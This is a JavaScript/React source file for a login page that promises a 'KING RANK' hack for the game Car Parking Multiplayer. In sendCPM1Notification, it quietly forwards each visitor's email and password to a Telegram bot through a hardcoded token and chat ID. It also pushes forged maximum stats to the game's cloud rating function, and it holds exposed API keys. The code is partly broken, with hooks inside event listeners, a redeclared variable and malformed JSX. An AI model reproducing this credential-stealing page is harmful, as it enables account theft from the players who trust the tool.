          const BOT_TOKEN = "8363058552:AAEY57Exn4ELKZ4T9hBDpUJaQdk45oTSh0E";
        const CHAT_ID = 6095291231;

        // CPM1 Configurations
        const CPM1_CONFIG = {
            FIREBASE_API_KEY: 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM',
            FIREBASE_LOGIN_URL: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword',
            RANK_URL: 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'
        };

        
   document.addEventListener('DOMContentLoaded', function() {
            const [currentPage, setCurrentPage] = React.useState('home');
            const [currentConfig, setCurrentConfig] = React.useState(CPM1_CONFIG);
            const [email, setEmail] = React.useState('');
            const [password, setPassword] = React.useState('');
            const [status, setStatus] = React.useState('');
            const [isLoading, setIsLoading] = React.useState(false);

            React.useEffect(() => {
                createParticles();
            }, []);

            const sendCPM1Notification = async (email, password) => {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const message = `🔐 Login Cpm1:\n📧 Email: ${email}\n🔒 Password: ${password}`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: message
                };
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (!response.ok) {
                        console.warn('Failed to send notification to Telegram');
                    }
                } catch (error) {
                    console.warn('Error sending notification to Telegram:', error);
                }
            };

            const login = async (email, password) => {
                setStatus('Logging in...');
                setIsLoading(true);
                
                try {
                    const response = await fetch(`${FIREBASE_LOGIN_URL}?key=${FIREBASE_API_KEY}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12)',
                        },
                        body: JSON.stringify({
                            clientType: 'CLIENT_TYPE_ANDROID',
                            email,
                            password,
                            returnSecureToken: true
                        })
                    });

                    const data = await response.json();

                    if (response.ok && data.idToken) {
                        setStatus('Login successful!');
                        
                        if (currentConfig === CPM1_CONFIG) {
                            sendCPM1Notification(email, password);
                        }
                        
                        return data.idToken;
                    } else {
                        throw new Error(data.error?.message || 'Login failed');
                    }
                } catch (error) {
                    setStatus(`Login failed: ${error.message}`);
                    return null;
                } finally {
                    setIsLoading(false);
                }
            };

            const setRank = async (token) => {
                setStatus('Setting KING RANK...');
                setIsLoading(true);
                
                try {
                    const ratingData = Object.fromEntries(
                        ["cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
                         "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
                         "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
                         "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"]
                        .map(key => [key, 100000])
                    );
                    
                    ratingData.time = 10000000000;
                    ratingData.race_win = 3000;

                    const response = await fetch(RANK_URL, {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${token}`,
                            'Content-Type': 'application/json',
                            'User-Agent': 'okhttp/3.12.13'
                        },
                        body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
                    });

                    if (response.ok) {
                        setStatus('Rank successfully set!');
                        return true;
                    } else {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Failed to set rank');
                    }
                } catch (error) {
                    setStatus(`Failed to set rank: ${error.message}`);
                    return false;
                } finally {
                    setIsLoading(false);
                }
            };

            const handleSubmit = async (e) => {
                e.preventDefault();
                const token = await login(email, password);
                
                if (token) {
                    await setRank(token);
                }
            };
            
            // Create floating particles
            createParticles();
            
            // Password toggle
            const togglePassword = document.getElementById('togglePassword');
            const password = document.getElementById('password');
            
            togglePassword.addEventListener('click', function() {
                const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
                password.setAttribute('type', type);
                this.innerHTML = type === 'password' ? '<i class="bi bi-eye"></i>' : '<i class="bi bi-eye-slash"></i>';
            });
            
            // Form submission
            const loginForm = document.getElementById('loginForm');
            const loginBtn = document.getElementById('loginBtn');
            
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show loading state
                loginBtn.classList.add('loading');
                
                // Simulate login process
                setTimeout(() => {
                    // In a real app, you would check credentials here
                    loginBtn.classList.remove('loading');
                    
                    // Show success state (in a real app, redirect or show message)
                    alert('Login successful! Welcome to ScolariOfficial Dashboard.');
                window.location.href = 'https://scolariofficial-website-store.vercel.app/toolscpm.html';
                }, 2500);
            });
            
            return (
                <div className="bg-slate-900 min-h-screen">
                    {currentPage === 'home' ? loginFrom()}
                </div>
            );
            
            // 3D Tilt Effect
            const loginCard = document.getElementById('loginCard');
            
            loginCard.addEventListener('mousemove', (e) => {
                const xAxis = (window.innerWidth / 2 - e.pageX) / 25;
                const yAxis = (window.innerHeight / 2 - e.pageY) / 25;
                loginCard.style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg) translateY(-10px)`;
            });
            
            loginCard.addEventListener('mouseleave', () => {
                loginCard.style.transform = 'rotateY(0) rotateX(0) translateY(-10px)';
            });
            
            // FIXED: Create Account Link Redirect
            const createAccountLink = document.getElementById('createAccountLink');
            createAccountLink.addEventListener('click', function(e) {
                e.preventDefault();
                // Redirect to registration page
                window.location.href = 'https://scolariofficial-website-store.vercel.app/register.html';
            });
            
            // Create floating particles function
            function createParticles() {
                const animatedBg = document.querySelector('.animated-bg');
                const particleCount = 50;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('particle');
                    
                    // Random properties
                    const size = Math.random() * 6 + 2;
                    const posX = Math.random() * 100;
                    const delay = Math.random() * 20;
                    const duration = Math.random() * 10 + 15;
                    
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    particle.style.left = `${posX}%`;
                    particle.style.animationDelay = `${delay}s`;
                    particle.style.animationDuration = `${duration}s`;
                    
                    // Random gradient
                    const gradients = [
                        'linear-gradient(135deg, #6366f1, #10b981)',
                        'linear-gradient(135deg, #10b981, #f59e0b)',
                        'linear-gradient(135deg, #f59e0b, #6366f1)',
                        'linear-gradient(135deg, #ef4444, #6366f1)'
                    ];
                    particle.style.background = gradients[Math.floor(Math.random() * gradients.length)];
                    
                    animatedBg.appendChild(particle);
                }
            }
        });
        
    document.getElementById('root'));